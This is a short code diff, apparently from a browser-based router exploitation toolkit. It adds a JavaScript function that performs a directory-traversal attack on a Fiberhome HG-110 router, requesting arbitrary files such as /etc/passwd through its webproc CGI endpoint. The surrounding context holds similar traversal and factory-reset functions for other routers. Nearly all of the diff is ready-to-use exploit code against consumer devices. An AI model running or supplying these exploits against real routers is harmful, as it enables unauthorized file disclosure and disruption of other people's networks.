@@ -185,6 +185,14 @@ function dslg624t_dirtraversal(ip)
 	document.location = "http://" + ip + "/cgi-bin/webcm?getpage=/././././././." + path;
 }
 
+// Fiberhome HG-110 - Directory Traversal
+function hg110_dirtraversal(ip)
+{
+	ip = ip || "192.168.1.1:8000";
+	path = prompt("Path: (ex: /etc/passwd)");
+	document.location = "http://" + ip + "/cgi-bin/webproc?getpage=../../../../../../../../../../../.." + path + "&var:menu=advanced&var:page=dns";
+}
+
 // Unicorn Router WB-3300NR - Factory Reset
 function wb3300nr_factoryreset(ip)
 {
